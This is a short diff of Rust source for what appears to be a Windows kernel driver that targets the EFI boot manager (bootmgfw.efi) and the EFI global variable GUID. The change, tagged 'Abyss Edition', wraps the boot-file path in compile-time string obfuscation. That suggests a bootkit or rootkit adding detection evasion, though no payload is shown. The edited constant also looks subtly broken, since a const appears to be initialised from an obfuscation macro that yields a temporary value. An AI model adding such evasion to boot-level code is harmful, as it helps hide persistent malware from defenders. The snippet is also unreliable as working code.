@@ -11,10 +11,13 @@ use wdk_sys::{NTSTATUS, STATUS_SUCCESS, STATUS_UNSUCCESSFUL};
 
 use crate::error::{ShadowError, ShadowResult};
 
-/// Path to the EFI System Partition (ESP).
+// Abyss Edition: String obfuscation
+use obfstr::obfstr;
+
+/// Path to the EFI System Partition (ESP) - Obfuscated at compile-time.
 /// This is typically at \\.\PhysicalDrive0\EFI\Microsoft\Boot\ or similar.
 /// Access requires mounting the ESP.
-const ESP_BOOT_PATH: &str = "\\EFI\\Microsoft\\Boot\\bootmgfw.efi";
+const ESP_BOOT_PATH: &str = obfstr!("\\EFI\\Microsoft\\Boot\\bootmgfw.efi");
 const EFI_GLOBAL_VARIABLE_GUID: [u8; 16] = [
     0x61, 0xDF, 0xE4, 0x8B, 0xCA, 0x93, 0xD2, 0x11, 0xAA, 0x0D, 0x00, 0xE0, 0x98, 0x03, 0x2B, 0x8C
 ];
